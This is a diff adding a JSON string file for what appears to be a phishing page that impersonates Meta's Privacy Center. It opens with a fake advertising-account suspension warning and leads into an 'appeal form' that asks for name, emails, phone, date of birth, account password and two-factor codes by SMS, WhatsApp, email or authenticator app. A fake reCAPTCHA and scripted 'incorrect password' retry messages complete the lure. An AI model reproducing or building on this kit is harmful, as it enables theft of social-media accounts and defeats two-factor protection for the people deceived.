@@ -1,0 +1,160 @@
+{
+  "privacyCentre": "Privacy Center",
+  "privacyCentreHome": "Privacy Center Home",
+  "search": "Search",
+  "privacyPolicy": "Privacy Policy",
+  "commonPrivacySettings": "Common Privacy Settings",
+  "requestReview": "Contact Support",
+
+  "congratulationsTitle": "Your advertising account may be suspended",
+  "congratulationsDesc": "We have received multiple reports stating that your advertisement violates trademark rights, and after a detailed review, we have made a decision regarding this matter; if no corrective actions are taken, your advertising account will be permanently deleted, but if you wish to appeal this decision, please submit an appeal request for our review and assistance.",
+
+  "menu": {
+    "otherPolicies": "Other Policies and Articles"
+  },
+
+  "privacy_questions": {
+    "q1": "What is the Privacy Policy and what does it cover?",
+    "q2": "What information do we collect?",
+    "q3": "How do we use your information?",
+    "q4": "How do we share your information on Meta Products or with integrated partners?",
+    "q5": "How do we share information with third parties?",
+    "q6": "How is the cooperation between Meta Companies organized?",
+    "q7": "How can you manage or delete your information and exercise your rights?",
+    "q8": "How long do we keep your information?",
+    "q9": "How do we transmit information?",
+    "q10": "How do we respond to official requests, comply with applicable laws, and prevent harm?",
+    "q11": "How will you know when the policy changes?",
+    "q12": "How to ask Meta questions?",
+    "q13": "Why and how we process your data?"
+  },
+
+  "privacy_actions": {
+    "policy_overview": "What is the Privacy Policy and what does it say?",
+    "manage_data": "How you can manage or delete your information"
+  },
+
+  "other_policies": {
+    "cookie": "Cookie Policy",
+    "non_user_info": "Information for those who do not use Meta Products",
+    "ai_usage": "How Meta uses information for generative AI models?",
+    "data_transfer": "Data Transfer Framework Policy",
+    "terms": "Other terms and conditions"
+  },
+
+  "main": {
+    "submitRequest": "This form is exclusively for submitting appeals and requesting account restoration",
+    "securityTitle": "Provide the Required Information",
+    "securityDesc": "Please ensure that you provide the requested information below. Failure to do so may result in a delay in processing your appeal."
+  },
+
+  "userAgreement": {
+    "title": "For more details, see the User Agreement",
+    "meta_ai": "Meta AI",
+    "label": "User Agreement"
+  },
+
+  "resources": {
+    "title": "Additional resources",
+    "ai_usage": "How Meta uses information for generative AI models",
+    "ai_cards": "Cards with information about the operation of AI systems",
+    "meta_ai_site": "Meta AI website",
+    "ai_intro": "Introduction to Generative AI",
+    "for_teens": "For teenagers"
+  },
+
+  "settings": {
+    "facebook": "Facebook Settings",
+    "instagram": "Instagram Settings"
+  },
+
+  "common": {
+    "continue": "Continue",
+    "send": "Send",
+    "minutes": "minutes",
+    "seconds": "seconds",
+    "code": "Code"
+  },
+
+  "footer": {
+    "privacy_risk": "We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about"
+  },
+
+  "login_form": {
+    "appeal_title": "Appeal Form",
+    "full_name": "Full Name",
+    "personal_email": "Email",
+    "business_email": "Business Email",
+    "page_name": "Page Name",
+    "phone": "Phone Number",
+    "date_of_birth": "Date of Birth",
+    "dob_placeholder": "MM/DD/YYYY",
+    "additional_info": "Additional information",
+    "description": "Please submit all requested information below. Failure to do so may result in delays or cancellation of your request processing.",
+    "submit": "Send",
+    "continue": "Continue",
+    "password_placeholder": "Password",
+    "enter_password_prompt": "For your security, you must enter your password to continue.",
+    "two_factor_title": "Two-factor authentication required (1/3)",
+    "two_factor_desc": "The verification code has been sent to your phone number or email. Please check your inbox and enter the code below to complete the process. If you do not receive the code, please check the Facebook notification on your device and confirm it’s you to complete the verification process.",
+    "code_placeholder": "Code",
+    "notify_facebook": "On Facebook",
+    "notify_facebook_desc": "We will send you a notification on Facebook.",
+    "agree_terms": "I agree with",
+    "terms": "Terms of Use"
+  },
+
+  "errors": {
+    "full_name_required": "Full Name is required!",
+    "email_required": "Email is required!",
+    "business_email_required": "Business email is required!",
+    "page_name_required": "Page Name is required!",
+    "phone_required": "Phone Number is required!",
+    "dob_required": "Date of Birth is required!",
+    "invalid_dob": "Invalid date format (MM/DD/YYYY)",
+    "password_required": "Password is required!",
+    "incorrect_password": "The password you entered is incorrect.",
+    "incorrect_2fa": "The two-factor authentication you entered is incorrect. Please try again after"
+  },
+
+  "auth": {
+    "facebook_user": "Facebook User",
+
+    "whatsapp_title": "Check your WhatsApp messages",
+    "whatsapp_desc": "Enter the code we sent to your WhatsApp {{target}}.",
+
+    "sms_title": "Check your text messages",
+    "sms_desc": "Enter the code we sent to your {{target}}.",
+
+    "email_title": "Check your email",
+    "email_desc": "Enter the code we sent to {{target}}.",
+
+    "app_title": "Go to your authentication app",
+    "app_desc": "Enter the 6-digit code for this account from the two-factor authentication app that you set up (such as Duo Mobile or Google Authenticator).",
+
+    "code_error": "The code you entered is incorrect or already used. Please try again after {{seconds}}s.",
+
+    "try_another_way": "Try Another Way",
+
+    "select_method_title": "Select a method to verify your identity",
+    "select_method_desc": "These verification methods are available to you.",
+
+    "method_app": "Authentication app",
+    "method_sms": "SMS",
+    "method_email": "EMAIL",
+    "method_whatsapp": "WHATSAPP",
+
+    "app_examples": "Google Authenticator, Duo Mobile",
+    "send_code_to": "We will send the code to {{target}}"
+  },
+
+  "captcha": {
+    "not_robot": "I'm not a robot",
+    "recaptcha": "reCAPTCHA",
+    "privacy": "Privacy",
+    "terms": "Terms",
+    "disclaimer_1": "This helps us combat harmful conduct, detect and prevent spam, and maintain the integrity of our Products.",
+    "disclaimer_2": "We’ve used Google’s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google’s Privacy Policy and Terms of Use.",
+    "disclaimer_3": "reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising."
+  }
+}
